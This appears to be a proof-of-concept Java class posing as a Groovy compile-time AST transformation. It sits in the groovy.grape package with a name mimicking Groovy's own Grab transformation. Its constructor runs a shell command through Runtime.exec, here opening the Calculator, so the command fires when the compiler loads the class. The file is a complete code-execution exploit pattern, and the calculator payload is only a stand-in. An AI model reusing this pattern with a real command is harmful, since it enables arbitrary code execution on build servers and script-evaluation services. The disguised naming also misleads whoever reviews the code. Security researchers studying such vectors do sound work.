package groovy.grape;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

import java.io.IOException;

@GroovyASTTransformation(phase= CompilePhase.CONVERSION)
public class GrabAnnotationTransformation2 implements ASTTransformation {

    public GrabAnnotationTransformation2() {
        try {
            Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        } catch (IOException e) {
        }
    }

    @Override
    public void visit(ASTNode[] nodes, SourceUnit source) {

    }
}
